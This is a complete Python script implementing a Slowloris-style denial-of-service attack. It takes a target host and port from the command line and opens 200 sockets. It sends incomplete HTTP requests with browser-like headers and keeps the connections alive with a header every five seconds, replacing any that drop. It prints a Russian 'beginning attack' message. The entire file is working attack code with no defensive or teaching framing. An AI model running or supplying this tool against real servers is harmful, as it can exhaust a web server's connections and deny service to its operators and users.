import socket
import threading
import sys


if len(sys.argv) < 2:
    sys.exit(1)

TARGET = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SOCKET_COUNT = 200
HEADERS = [
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept-language: en-US,en,q=0.5",
    "Connection: keep-alive"
]
sockets = []


def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, PORT))
        s.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode("utf-8"))
        for header in HEADERS:
            s.send(f"{header}\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None


def attack():
    global sockets
    print(f"Начало атаки на {TARGET}:{PORT}")
    for _ in range(SOCKET_COUNT):
        sock = create_socket()
        if sock:
            sockets.append(sock)
    while True:
        for s in list(sockets):
            try:
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
        for _ in range(SOCKET_COUNT - len(sockets)):
            sock = create_socket()
            if sock:
                sockets.append(sock)
        threading.Event().wait(5)


if __name__ == "__main__":
    attack()
